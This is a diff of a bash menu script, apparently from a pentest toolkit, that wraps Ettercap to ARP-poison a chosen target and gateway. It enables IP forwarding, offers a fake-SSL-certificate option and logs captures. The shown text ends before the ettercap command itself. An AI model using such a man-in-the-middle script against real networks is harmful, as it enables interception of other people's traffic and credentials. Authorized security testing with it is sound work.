@@ -1,79 +1,59 @@
 #!/bin/bash
 # Ettercap ARP cache poison script
+clear
 
 #this block controls the features for px_interface_selector
 include_monitor=0
+include_airbase=0
 require_ip=1
 message="sniff/poison on"
-. /opt/pwnix/pwnpad-scripts/px_interface_selector.sh
+. /opt/pwnix/pwnpad-scripts/px_functions.sh
 
 f_banner(){
-  clear
-  echo "Ettercap-NG 0.8.0 ARP Cache Poison Tool"
-  echo
-  echo "[!] Use on networks you are connected to!"
-  echo
-  echo "[!] DO NOT USE WITH EVILAP - IT WON'T WORK!"
-  echo
-}
-
-f_one_or_two(){
-  read -p "Choice [1-2]: " input
-  case $input in
-    [1-2]*) echo $input ;;
-    *)
-      f_one_or_two
-      ;;
-  esac
+  printf "\nEttercap-NG 0.8.0 ARP Cache Poison Tool\n\n"
+  printf "[!] Use on networks you are connected to!\n\n"
 }
 
 f_sslfake(){
-  clear
-  echo
-  echo "Would you like to use the Invalid SSL Cert option?"
-  echo
-  echo "Good for testing user policy to make sure users aren't accepting bad certs!"
-  echo
-  echo "NOTE: if using SSLstrip with Ettercap this is unnecessary"
-  echo
-  echo "1. Yes"
-  echo "2. No "
-  echo
+  printf "\nWould you like to use the Invalid SSL Cert option?\n\n"
+  printf "Good for testing user policy to make sure users aren't accepting bad certs!\n\n"
+  printf "NOTE: if using SSLstrip with Ettercap this is unnecessary\n\n"
+  printf "1. Yes\n"
+  printf "2. No\n\n"
   sslfakecert=$(f_one_or_two)
 }
 
 f_logging(){
   clear
-  echo
-  echo "Would you like to log data?"
-  echo
-  echo "Captures saved to /opt/pwnix/captures/ettercap/"
-  echo
-  echo "1. Yes"
-  echo "2. No "
-  echo
+  printf "\nWould you like to log data?\n\n"
+  printf "Captures saved to /opt/pwnix/captures/ettercap/\n\n"
+  printf "1. Yes\n"
+  printf "2. No\n\n"
 
   logchoice=$(f_one_or_two)
 }
 
 f_generate_filename(){
-  echo "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)"
+  printf "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)\n"
 }
 
 f_run(){
-  echo 1 > /proc/sys/net/ipv4/ip_forward
+  printf 1 > /proc/sys/net/ipv4/ip_forward
 
   filename=$(f_generate_filename)
 
   clear
-  echo
+  printf "\n"
   read -p "Enter target IP to ARP cache poison: " target1
-  echo
+  printf "\n"
 
   clear
-  echo
+  printf "\n"
   read -p "Enter target IP of gateway/router: " gw
-  echo
+  printf "\n"
+
+  #ettercap fails if the interface is down
+  ip link set $interface up
 
   if [ $logchoice -eq 1 ]; then
     if [ $sslfakecert -eq 1 ]; then
